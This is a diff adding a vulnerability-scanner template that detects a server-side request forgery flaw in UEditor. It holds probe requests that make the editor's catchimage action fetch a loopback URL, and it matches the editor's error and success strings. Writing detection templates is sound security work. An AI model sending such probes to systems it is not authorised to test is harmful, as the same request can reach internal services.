@@ -1,0 +1,26 @@
+id: ueditor-ssrf
+brief:
+    title: UEditor - Server Side Request Forgery
+    by: pwnhxl
+    level: medium
+    about: UEditor contains an Server Side Request Forgery vulnerability.
+    label:
+        - ueditor
+        - ssrf
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png'
+        - '{{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png'
+      signs:
+        - "on": word
+          has:
+            - \u94fe\u63a5\u4e0d\u53ef\u7528
+            - '"original":'
+            - '"SUCCESS"'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
